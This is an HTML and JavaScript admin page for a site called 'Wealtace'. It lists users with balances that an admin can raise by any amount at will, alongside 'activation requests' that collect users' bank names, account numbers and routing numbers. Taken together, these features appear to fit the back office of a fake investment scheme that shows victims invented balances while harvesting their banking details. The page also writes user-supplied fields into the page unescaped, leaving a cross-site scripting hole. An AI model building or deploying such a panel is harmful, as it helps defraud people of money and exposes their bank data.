<!DOCTYPE html><html><head><title>Wealtace Control Panel</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
:root{--blue:#002B7F;--red:#CE1126;--green:#28a745;--bg:#F0F4FF;}
*{margin:0;padding:0;font-family:'Segoe UI',Arial;box-sizing:border-box}
.header{background:var(--blue);color:#fff;padding:20px;text-align:center;border-bottom:4px solid var(--red)}
.container{max-width:1100px;margin:30px auto;padding:20px}
.card{background:#fff;padding:25px;border-radius:12px;box-shadow:0 4px 15px rgba(0,0,0,0.1);margin-bottom:25px;border-top:4px solid var(--red)}
h2{color:var(--blue);margin-bottom:15px}
table{width:100%;border-collapse:collapse;font-size:14px}
th,td{padding:10px;text-align:left;border-bottom:1px solid #eee}
th{background:var(--blue);color:#fff;position:sticky;top:0}
input{padding:8px;width:100px;border:1px solid #ddd;border-radius:6px}
.btn{background:var(--green);color:#fff;border:none;padding:8px 12px;border-radius:6px;cursor:pointer;font-weight:bold}
.btn:hover{background:var(--red)}
.badge{background:var(--red);color:#fff;padding:3px 8px;border-radius:12px;font-size:12px}
</style>
</head><body>

<div class="header">
<h1>🇺🇸 WEALTACE CONTROL PANEL 🇨🇷</h1>
<p>Admin Only - Manage Users & Activations</p>
</div>

<div class="container">

<div class="card">
<h2>1. All Users <span class="badge" id="userCount">0</span></h2>
<table id="usersTable">
<tr><th>#</th><th>Name</th><th>Email</th><th>Balance</th><th>Credit $</th></tr>
</table>
</div>

<div class="card">
<h2>2. Activation Requests <span class="badge" id="actCount">0</span></h2>
<table id="activateTable">
<tr><th>Date</th><th>User</th><th>Bank/CU</th><th>Account Name</th><th>Account No</th><th>Routing</th></tr>
</table>
</div>

</div>

<script>
function loadData(){
let users = JSON.parse(localStorage.getItem('wealtace_users')) || [];
let activations = JSON.parse(localStorage.getItem('wealtace_activations')) || [];

document.getElementById('userCount').innerText = users.length;
document.getElementById('actCount').innerText = activations.length;

// USERS
let userHTML = '';
users.forEach((u, i)=>{
userHTML += `<tr>
<td>${i+1}</td>
<td>${u.name}</td>
<td>${u.email}</td>
<td>$${(u.balance||0).toFixed(2)}</td>
<td><input type="number" id="credit${i}" placeholder="0">
<button class="btn" onclick="creditUser(${i})">Credit</button></td>
</tr>`;
});
document.getElementById('usersTable').innerHTML += userHTML;

// ACTIVATIONS
let actHTML = '';
activations.reverse().forEach(a=>{
actHTML += `<tr>
<td>${a.date}</td>
<td>${a.email}</td>
<td><b>${a.bank}</b></td>
<td>${a.name}</td>
<td>${a.acc}</td>
<td>${a.routing}</td>
</tr>`;
});
document.getElementById('activateTable').innerHTML += actHTML;
}

function creditUser(index){
let users = JSON.parse(localStorage.getItem('wealtace_users'));
let amount = parseFloat(document.getElementById('credit'+index).value);
if(!amount || amount <= 0) return alert('Enter valid amount');

users[index].balance = (users[index].balance || 0) + amount;
localStorage.setItem('wealtace_users', JSON.stringify(users));
alert('Credited $' + amount.toFixed(2) + ' to ' + users[index].name);
location.reload();
}

loadData();
</script>
</body></html>
